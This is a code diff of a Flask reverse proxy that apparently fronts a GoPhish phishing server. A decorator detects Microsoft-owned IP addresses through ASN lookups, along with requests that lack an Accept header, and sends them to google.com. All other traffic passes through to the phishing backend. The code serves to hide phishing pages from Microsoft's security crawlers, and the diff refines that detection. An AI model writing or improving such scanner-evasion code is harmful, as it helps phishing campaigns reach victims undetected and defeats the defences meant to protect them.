@@ -10,9 +10,9 @@ import requests
 def is_microsoft_ans(ip):
     res = IPWhois(ip).lookup_rdap(depth=1)
     try:
-        if 'microsoft' in res['objects']['MSFT']['contact']['name'].lower():
+        if 'microsoft' in res['asn_description'].lower():
             return True
-    except KeyError:
+    except:
         pass
     return False
 
@@ -20,7 +20,7 @@ def crawler(fn):
     def wrapper(*args, **kwargs):
         client_ip = request.headers.get('X-Forwarded-For', '').split(',')[0] or request.remote_addr
         if is_microsoft_ans(client_ip) or not request.headers.get('Accept', ''):
-            app.logger.info(f"REDIRECTED")
+            app.logger.warning(f"REDIRECTED")
             return redirect('https://google.com')
         return fn(*args, **kwargs)
     return wrapper
@@ -51,6 +51,6 @@ def redirect_to_gophish(path):
     excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
     headers = [(name, value) for (name, value) in res.raw.headers.items()
                if name.lower() not in excluded_headers]
-
+    
     response = Response(res.content, res.status_code, headers)
     return response
